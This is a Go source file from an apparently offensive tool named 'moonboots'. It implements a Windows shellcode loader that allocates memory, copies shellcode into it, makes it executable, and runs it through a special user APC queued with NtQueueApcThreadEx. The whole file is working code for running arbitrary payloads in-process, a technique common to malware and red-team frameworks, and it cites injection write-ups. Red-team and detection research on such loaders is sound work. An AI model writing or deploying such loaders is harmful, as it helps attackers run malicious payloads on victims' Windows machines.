package loaders

import (
	"fmt"
	"github.com/ma111e/moonboots/internal/consts"
	"github.com/ma111e/moonboots/internal/defs"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"unsafe"
)

/*
This technique executes shellcode in the current process using the following steps
 1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
 2. Copy the shellcode to the allocated memory space
 3. Change the memory page permissions to Execute/Read with VirtualProtect
 4. Get a handle to the current thread
 4. Execute the shellcode in the current thread by creating a "Special User APC" through the NtQueueApcThreadEx function

References:
 1. https://repnz.github.io/posts/apc/user-apc/
 2. https://docs.rs/ntapi/0.3.1/ntapi/ntpsapi/fn.NtQueueApcThreadEx.html
 3. https://0x00sec.org/t/process-injection-apc-injection/24608
 4. https://twitter.com/aionescu/status/992264290924032005
 5. http://www.opening-windows.com/techart_windows_vista_apc_internals2.htm#_Toc229652505
*/

const (
	LdrQueueAPC = "queueapc"
)

type QueueAPCLoader struct {
	Base
}

func init() {
	AvailableLoaders.Register(LdrQueueAPC, &QueueAPCLoader{})
}

func (ldr QueueAPCLoader) ValidArchs() []string {
	//return consts.VALID_ARCH_AMD64
	return consts.VALID_ARCH_BOTH
}

func (ldr QueueAPCLoader) Run(shellcode []byte) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")

	log.Debugln("Calling VirtualAlloc for shellcode...")
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), defs.MEM_COMMIT|defs.MEM_RESERVE, defs.PAGE_READWRITE)

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualAlloc: %s", err)
	}

	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed and returned 0")
	}

	log.Printf("Allocated %d bytes", len(shellcode))

	log.Debugln("Copying shellcode to memory with copy")

	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)

	log.Println("Shellcode copied to memory")

	log.Debugln("Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")

	oldProtect := defs.PAGE_READWRITE
	_, _, err = VirtualProtect.Call(addr, uintptr(len(shellcode)), defs.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualProtect: %s", err)
	}
	log.Println("Shellcode memory region changed to PAGE_EXECUTE_READ")

	log.Debugln("Calling GetCurrentThread...")
	thread, _, err := GetCurrentThread.Call()
	if err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling GetCurrentThread: %s", err)
	}
	log.Println("Got handle to current thread: %v\n", thread)

	log.Debugln("Calling NtQueueApcThreadEx...")
	//USER_APC_OPTION := uintptr(QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC)
	_, _, err = NtQueueApcThreadEx.Call(thread, defs.QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, addr, 0, 0, 0)
	if err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling NtQueueApcThreadEx: %s", err)
	}

	log.Println("Queued special user APC")
	log.Println("Shellcode Executed")

	return nil
}
